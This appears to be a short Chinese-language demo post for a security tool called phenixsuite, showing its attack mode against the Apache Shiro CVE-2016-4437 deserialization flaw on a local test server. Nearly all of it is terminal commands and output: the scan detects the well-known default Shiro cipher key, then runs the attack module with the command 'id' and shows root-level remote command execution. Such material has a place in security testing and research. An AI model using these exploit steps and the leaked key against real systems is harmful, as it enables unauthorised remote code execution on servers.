psf最近优化了下attack的功能模块,今天拿shiro这个漏洞为例，展示如何使用attack

```bash
╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
╰─λ ./phenixsuite search --poc shiro                                         0 < 00:00:00 < 18:07:46
 #   Poc Name                                      
--- -----------------------------------------------
 0   poc-yaml-jackson-shiro-jndi-code-exec-reverse 
 1   poc-go-shiro-cve-2016-4437                    
 2   poc-go-shiro-detect                           
╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login                0 < 00:00:01 < 18:10:28
2021/02/01 18:10:40 scan.go:496: [INFO ] verify poc-go-shiro-cve-2016-4437
2021/02/01 18:10:40 scan.go:142: [INFO ] scan poc num:1 total:1
2021/02/01 18:10:40 shiro_cve_2016_4437_rce.go:290: [INFO ] Detect shiro
2021/02/01 18:10:42 shiro_cve_2016_4437_rce.go:237: [INFO ] html similar is 1, key is: kPH+bIxk5D2deZiIxcaaaA==
2021/02/01 18:10:42 shiro_cve_2016_4437_rce.go:238: [INFO ] Key Found: kPH+bIxk5D2deZiIxcaaaA==
2021/02/01 18:10:42 scan.go:419: [INFO ] vul exist poc:poc-go-shiro-cve-2016-4437 url:http://127.0.0.1:8080/login
 #   target-url                    poc-name                     gev-id       level      category    status   author   require      detail-extend                                         
--- ----------------------------- ---------------------------- ------------ ---------- ----------- -------- -------- ------------ -------------------------------------------------------
 1   http://127.0.0.1:8080/login   poc-go-shiro-cve-2016-4437   GEV-141894   critical   code-exec   exist    huakai   GEV-142951   cipherKey is kPH+bIxk5D2deZiIxcaaaA==, type is AES128 
╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login --mode attack --show
2021/02/01 18:10:59 cmd.go:332: [INFO ] 传入参数列表
 Param     Require                             Help 
--------- ----------------------------------- ------
 command   optional,whoami                          
 key       optional,kPH+bIxk5D2deZiIxcaaaA==    
 ╭─huakai at huakai-deMacBook-Pro in ⌁/go/src/phenixsuite (develop ●2✚5…1⚑70)
 ╰─λ ./phenixsuite scan --poc poc-go-shiro-cve-2016-4437 --url http://127.0.0.1:8080/login --mode attack --options shell
 input key (optional,kPH+bIxk5D2deZiIxcaaaA==): 
 input command (optional,whoami): id
 2021/02/01 18:11:37 scan.go:496: [INFO ] attack poc-go-shiro-cve-2016-4437
 2021/02/01 18:11:37 scan.go:142: [INFO ] scan poc num:1 total:1
 2021/02/01 18:11:38 shiro_cve_2016_4437_rce.go:356: [INFO ] Command Exec Success: id
 2021/02/01 18:11:38 scan.go:419: [INFO ] vul exist poc:poc-go-shiro-cve-2016-4437 url:http://127.0.0.1:8080/login
  #   target-url                    poc-name                     gev-id       level      category    status   author   require      detail-extend                                         
 --- ----------------------------- ---------------------------- ------------ ---------- ----------- -------- -------- ------------ -------------------------------------------------------
  1   http://127.0.0.1:8080/login   poc-go-shiro-cve-2016-4437   GEV-141894   critical   code-exec   exist    huakai   GEV-142951   cipherKey is kPH+bIxk5D2deZiIxcaaaA==, type is AES128 
                                                                                                                                    command result:                                       
                                                                                                                                    uid=0(root) gid=0(root) groups=0(root)                
                                                                                                                                                                                          
```


### 参考链接
- https://mp.weixin.qq.com/s/5iYyRGnlOEEIJmW1DqAeXw